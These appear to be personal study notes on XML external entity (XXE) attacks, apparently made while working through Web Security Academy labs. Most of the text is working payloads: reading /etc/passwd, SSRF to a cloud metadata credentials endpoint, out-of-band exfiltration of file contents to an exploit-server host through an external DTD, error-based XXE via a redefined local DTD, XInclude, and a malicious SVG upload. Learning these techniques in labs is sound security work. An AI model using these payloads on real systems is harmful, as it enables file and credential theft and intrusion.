xxe vulnerabilities arise because the XML specification contains various potentially dangerous features, and standard parsers support these features even if they are not normally used by the applications.

entities --> way of representing an item of data withtin an xml document

DTD --> to define the structure of xml document, type of value it can contain

thus we can create custom entities and load them into other places

<!DOCTYPE test [ <!ENTITY varname "<value>"> ]>

thus is entity can be accssed like an variable anywhere,like
&varname which holds <value>

enternal entities can also be loaded

<!DOCTYPE test [ <!ENTITY test_var SYSTEM 'file:///etc/passwd'> ]>

this take the contents of the file and store it in test, which can be accessed as &test_var

External entities to retrieve files:

	<!DOCTYPE test1 [ <!ENTITY test SYSTEM "file:///etc/passwd">]><stockCheck><productId>

&test;</productId><stockCheck>

the input is check as product value and retured as error

External entitites to ssrf:

	<!DOCTYPE test1 [<!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>

to make request to internal server and get sensitive data

if regular entities are blocked

<!ENTITY % <varname> SYSTEM "<url><file>">
%<varname>;

eg:
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>


<!DOCTYPE r [

<!ELEMENT r ANY >

<!ENTITY % file_request SYSTEM "https://ac211fa11ee553288081819b013e006d.web-security-academy.net/dtd.xml">

%file_request;
%take_data;
]>
<stockCheck>
	<productId>
		&return_request;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>

dtd.xml file in exploit server :

<!ENTITY % data SYSTEM "file:///etc/hostname">
<!ENTITY % take_data 
	"<!ENTITY return_request SYSTEM 
		'https://ac211fa11ee553288081819b013e006d.web-security-academy.net/here_is_your_data?%data;'>">


if the error returns value, we can use that make errors and get sensitive data

<!DOCTYPE test [
	<!ENTITY % file_request SYSTEM 
		"https://aca81f7a1fc98f2c80b9209401b800e0.web-security-academy.net/exploit.xml">

%file_request;

%okay;

] >

<stockCheck>
	<productId>
		&return_data;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>

exploit.xml:

<!ENTITY % what SYSTEM 'file:///etc/passwd'>
<!ENTITY % okay 
	"<!ENTITY return_data SYSTEM 'file:///etc/%what;'>">


local DTD redefining to invoke error based xxe

when there is hybrid structure, if external entities load can be redefined by the internal entities, this redefining bypasses the restrictions in parameter entity usage

<!DOCTYPE foo [

<!ENTITY % get SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">

<!ENTITY % ISOamso '

<!ENTITY &#37; file SYSTEM "file:///etc/passwd">

<!ENTITY &#37; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///tes/&#x25;file;&#x27;>">

&#x25;eval;

&#x25;error;

'>

 %get;

]>

<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>


html encode those inner &,',%

xinclude attack:

	when we dont have control over the doctype we can declare entities, but we can use xinclude

first you need to reference xinclude namespace 

<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo> 

xxe in file upload
vulnerbale formats - docx, svg

even if the application doesnt accept svg they image parsing library used may prase svg which will lead to blind xxe

<?xml version="1.0" standalone="yes"?>

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>

<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">

   <text font-size="16" x="0" y="16">&xxe;</text>

</svg>

some endpoints might accept many types

we can change the content type to application/xml to attack those points


